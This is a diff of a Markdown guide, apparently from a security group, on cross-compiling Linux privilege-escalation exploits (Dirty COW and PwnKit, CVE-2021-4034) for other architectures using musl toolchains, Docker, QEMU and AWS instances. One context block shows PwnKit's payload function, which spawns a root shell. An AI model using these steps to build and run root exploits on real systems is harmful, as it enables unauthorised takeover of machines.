@@ -7,6 +7,8 @@ Let's compile the exploit for [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cven
 
 The vulnerability is a local privilege escalation in Linux Kernel <4.8.3.
 
+# Static Compiling
+
 ## Using muslcc toolchain
 
 The musl libc is a C standard library just like GNU's libc. It's smaller, cleaner and easier to handle.
@@ -33,7 +35,7 @@ docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:armv6-linux-musleabi sh -c 
 
 The newly created `./dirty-exp` binary will execute on a Raspberry Pi Linux (armv6l).
 
-## Cross Compiling for 5 architectures
+## Musl Cross Compiling for 5 architectures
 
 Let's script this and compile for 5 different architectures:
 ```shell
@@ -75,6 +77,8 @@ apk update \
 && gcc -I/src/usr/include -L/src/usr/lib -pthread dirty.c -o dirty-exp -lcrypt -lcrypto -lssl -static
 ```
 
+# Non-Static compiling
+
 ## Exploits that can not be static
 
 Some exploits can not be compiled statically.
@@ -83,40 +87,73 @@ For example: Exploits that are shared object .so files and which the vulnerable 
 
 The ABI is the reason why you can not just execute a (dynamic) binary from a libmusl system on a libc system or vice versa.
 
-### Use AWS to pick the matching architecture
+These exploits need to be compiled on the matching OS with matching architecture. In our example we try to compile an exploit that needs a shared library (and thus can not be statically compiled) for aarch64 (aka arm64v8) to run on Amazon Linux 2 (which is based on Centos7 OS). 
 
-The assumption is that it is not possible to compile the exploit on the target system. Instead we use a system with the same architecture and where the Linux flavour is a close match to the target system (a matching libc version often is what matters most).
 
-AWS has a good selection of Linux flavours (Ubuntu, Red Hat, SuSE and Debian) that can run on either x86_64 or aarch64/ARM64 architecture. For example we may use a t2.nano instance (free) on aarch64 architecture that runs Ubuntu to compile an exploit (for a target that runs Ubuntu on aarch64).
+There are a few methods to pick from:
+1. Use an Amazon Linux 2/aarch64 instance.
+1. Find a server of the same architecture and use Docker to run Centos7.
+1. Use QEMU and Docker to run any OS of any architecture.
 
-### Use Docker to pick the matching OS
+### Method 1 - Using Amazon Linux 2/aarch64
 
-Sometimes it's required that the OS version used for compiling the exploit is an exact match to the target OS & architecture. In this case we run Ubuntu OS on the same architecture as the target and then use Docker to run the target's OS inside Ubuntu.
+AWS has a good selection of Linux flavours (Ubuntu, Red Hat, SuSE and Debian) that can run on either x86_64 or aarch64/ARM64 architecture. It is free to run a t2.nano on aarch64 and running Amazon Linux 2.
 
-For example we may want to compile and test an exploit for Centos7 on aarch64. We can do this by spinning up an AWS aarch64 instance on Ubuntu, install Docker and run Centos7:
+### Method 2 - Use any aarch64 with Docker running Centos7
+
+Let's assume Method 1 is not available.
+
+Pick any server that runs on aarch64. Start a Docker image matching the target's OS. In this example I'm on a aarch64 server running Debian but my exploit needs to be compiled for Centos (Amazon Linux 2) also on aarch64.
+
 ```console
-[root@ip-172-22-17-199 ~]# uname -m    # AWS Instance running Ubuntu on aarch64
+$ uname -m
 aarch64
-[root@ip-172-22-17-199 ~]# docker run --rm -v $(pwd):/src -it centos:centos7
-Unable to find image 'centos:centos7' locally
-centos7: Pulling from library/centos
-Digest: sha256:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407
-Status: Downloaded newer image for centos:centos7
-[root@2296b2d72191 /]# yum group install "Development Tools"
-...
-[root@2296b2d72191 /]# gcc --version
-gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)
-Copyright (C) 2015 Free Software Foundation, Inc.
-This is free software; see the source for copying conditions.  There is NO
-warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-[root@2296b2d72191 /]#
+$ docker run --rm -v $(pwd):/src -it centos:centos7
+[root@9409baa1861a /]# 
 ```
 
-THC also runs a private lab for some exotic architectures and Unix flavours.
+### Method 3 - QEMU and Docker
 
-### Compiling [CVE-2021-4034] for aarch64
 
-Back to our example for an exploit that can not be compiled staticallly:
+Docker can run images for [https://github.com/multiarch/qemu-user-static](different architectures). The execution is emulated by QEMU. The details are not noticeable to the user and 'docker just does it all for you'.
+
+Firstly let's prepare Docker to run images of different architectures:
+```console
+$ docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
+``` 
+
+Then let's run an aarch64 image (aka arm64v8) on our x86_64 host:
+```console
+$ uname -m
+x86_64
+$ docker run --rm -it arm64v8/centos
+[root@0a0888cd5ea7 /]# uname -m
+aarch64
+```
+
+All started binaries are automatically started via qemu. Let's check the host system:
+```console
+$ docker run --rm -t arm64v8/centos sleep 1337 &
+[1] 4042135
+$ ps axw | grep qemu 
+4046761 pts/0    Ssl+   0:00 /usr/bin/qemu-aarch64-static /usr/bin/coreutils --coreutils-prog-shebang=sleep /usr/bin/sleep 1337
+$ 
+```
+
+We can use this image to compile our exploit (see below). We picked a distribution (Centos7 in this case) that is close to our target system. Amazon Linux 2 AMI is based on Centos.  
+
+
+# Compiling an exploit
+
+# Compiling [CVE-2021-4034] for aarch64
+
+Any of the 3 methods above work.
+
+
+## Preparing the exploit
+
+
+Back to our example for an exploit that can not be compiled statically:
 
 A good example is [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/) also known as polkit/pkexec exploit. The exploit compiles additional .c files during runtime _and_ the vulnerable program needs to load the newly compiled .so file.
 
@@ -152,6 +189,28 @@ void gconv_init() {
 	system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
 }
 ```
+
+For example we may want to compile and test an exploit for Centos7 on aarch64. We can do this by spinning up an AWS aarch64 instance on Ubuntu, install Docker and run Centos7:
+```console
+[root@ip-172-22-17-199 ~]# uname -m    # AWS Instance running Ubuntu on aarch64
+aarch64
+[root@ip-172-22-17-199 ~]# docker run --rm -v $(pwd):/src -it centos:centos7
+Unable to find image 'centos:centos7' locally
+centos7: Pulling from library/centos
+Digest: sha256:c73f515d06b0fa07bb18d8202035e739a494ce760aa73129f60f4bf2bd22b407
+Status: Downloaded newer image for centos:centos7
+[root@2296b2d72191 /]# yum group install "Development Tools"
+...
+[root@2296b2d72191 /]# gcc --version
+gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)
+Copyright (C) 2015 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+[root@2296b2d72191 /]#
+```
+
+
+
 
 Compile both source files:
 ```shell
